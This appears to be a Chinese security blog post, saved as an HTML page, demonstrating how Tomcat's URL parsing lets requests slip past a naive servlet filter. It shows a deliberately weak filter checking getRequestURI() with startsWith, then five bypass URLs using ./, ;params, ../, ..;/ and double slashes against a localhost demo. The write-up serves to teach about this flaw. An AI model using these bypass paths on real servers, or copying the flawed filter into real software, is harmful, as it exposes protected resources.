@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Tomcat URL 解析差异性攻击利用看个访问限制绕过的场景。 假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等： &lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt; &lt;html&gt; &lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%20URL%20%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Tomcat URL 解析差异性攻击利用看个访问限制绕过的场景。 假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等： &lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt; &lt;html&gt; &lt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/TomcatURL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/media/rId21.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/TomcatURL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/media/rId22.png">
+<meta property="article:published_time" content="2022-07-08T06:26:05.969Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/TomcatURL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/media/rId21.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Tomcat URL解析差异性导致的安全问题/调试分析/Tomcat URL 解析差异性攻击利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%20URL%20%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.969Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Tomcat-URL-解析差异性攻击利用"><a href="#Tomcat-URL-解析差异性攻击利用" class="headerlink" title="Tomcat URL 解析差异性攻击利用"></a>Tomcat URL 解析差异性攻击利用</h2><p>看个访问限制绕过的场景。</p>
+<p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p>
+<pre><code>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Secret&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+username: mi1k7ea&lt;br&gt;
+password: 123456&lt;br&gt;
+address: china&lt;br&gt;
+phone: 13666666666&lt;br&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p>
+<pre><code>package filter;
+
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.io.IOException;
+
+public class testFilter implements Filter &#123;
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException &#123;
+
+    &#125;
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
+        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;
+        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;
+
+        String url = httpServletRequest.getRequestURI();
+
+        if (url.startsWith(&quot;/urltest/info&quot;)) &#123;
+            httpServletResponse.getWriter().write(&quot;No Permission.&quot;);
+            return;
+        &#125;
+
+        filterChain.doFilter(servletRequest, servletResponse);
+    &#125;
+
+    @Override
+    public void destroy() &#123;
+
+    &#125;
+&#125;
+</code></pre>
+<p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p>
+<p>编辑web.xml，添加testFilter设置：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+         version=&quot;4.0&quot;&gt;
+    &lt;filter&gt;
+        &lt;filter-name&gt;testFilter&lt;/filter-name&gt;
+        &lt;filter-class&gt;filter.testFilter&lt;/filter-class&gt;
+    &lt;/filter&gt;
+    &lt;filter-mapping&gt;
+        &lt;filter-name&gt;testFilter&lt;/filter-name&gt;
+        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+    &lt;/filter-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p>
+<p><img src="/resource/TomcatURL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/media/rId21.png"></p>
+<p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p>
+<pre><code>http://localhost:8080/urltest/./info/secret.jsp
+http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp
+http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp
+http://localhost:8080/urltest/mi1k7ea/..;/info/secret.jsp
+http://localhost:8080//urltest/info/secret.jsp
+</code></pre>
+<p><img src="/resource/TomcatURL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/media/rId22.png"></p>
+<p>整个的过程大致如此，就是利用解析的差异性来绕过认证</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%20URL%20%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/" data-id="cl5c2qxio00k6y8v1at270ts9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%E5%AF%B9URL%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E5%A4%84%E7%90%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%20getServletPath()%E7%9A%84%E5%A4%84%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
